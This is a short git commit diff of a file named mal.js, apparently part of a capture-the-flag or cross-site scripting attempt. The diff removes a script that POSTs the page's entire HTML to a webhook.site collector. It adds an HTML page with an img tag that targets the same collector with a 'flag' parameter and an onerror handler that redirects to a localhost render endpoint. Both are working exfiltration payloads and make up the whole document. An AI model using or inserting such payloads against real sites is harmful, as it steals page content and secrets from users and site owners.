6cd7ce6375c7db85f4d0bf86cb150396a5312238
0X1622 <0x1622@0X1622-2.local>
2024-04-20 23:31:21 +0530

    hey

--- mal.js
+++ mal.js
@@ -1,6 +1,5 @@
-<script>
-    fetch("https://webhook.site/1fd7356f-ffeb-43d5-b88a-0448896b6ee9", {
-        method: "POST",
-        body: document.documentElement.outerHTML
-    });
-</script>
+<html>
+  <body>
+    <img src="https://webhook.site/1fd7356f-ffeb-43d5-b88a-0448896b6ee9/?flag=" onerror="this.src='http://localhost/render?id=flag'">
+  </body>
+</html>
